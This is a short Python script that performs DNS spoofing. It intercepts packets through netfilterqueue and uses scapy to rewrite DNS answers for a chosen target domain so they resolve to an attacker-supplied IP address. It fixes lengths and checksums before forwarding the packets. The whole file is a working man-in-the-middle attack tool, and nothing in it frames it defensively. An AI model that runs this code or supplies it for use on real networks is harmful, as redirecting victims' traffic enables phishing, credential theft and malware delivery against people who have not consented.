# Imports
import optparse
import netfilterqueue
import scapy.all as scapy


# Get Arguments from CLI
def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Specify Target")
    parser.add_option("-ip", "--ip-address", dest="ip", help="Specify Redirect IP")

    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify target. Use --help for more info.")
    if not options.ip:
        parser.error("[-] Please specify ip address. Use --help for more info.")

    return options


# Process Packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if target in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    # Forwarding the packet
    packet.accept()


# Storing Arguments
target = get_args().target
ip = get_args().ip


# Creating Queue
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

# Running the Queue
queue.run()
